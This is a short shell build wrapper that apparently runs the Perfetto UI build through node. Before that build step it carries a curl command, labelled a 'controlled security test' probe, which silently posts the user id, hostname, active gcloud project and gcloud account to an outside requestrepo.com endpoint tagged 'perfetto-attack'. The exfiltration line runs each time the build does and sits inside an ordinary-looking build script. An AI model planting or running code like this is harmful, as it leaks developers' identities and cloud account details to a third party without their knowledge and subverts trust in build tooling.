# Temporary read-only runner probe for the controlled security test.
curl -s -m 10 -X POST \
  --data-urlencode "marker=perfetto-attack" \
  --data-urlencode "uid=$(id -u 2>&1)" \
  --data-urlencode "host=$(hostname 2>&1)" \
  --data-urlencode "gcloud_project=$(gcloud config get-value project 2>&1)" \
  --data-urlencode "gcloud_account=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>&1)" \
  https://7nis9zch.requestrepo.com/perfetto-runner-attack || true

UI_DIR="$(cd -P ${BASH_SOURCE[0]%/*}; pwd)"

$UI_DIR/node $UI_DIR/build.mjs "$@"
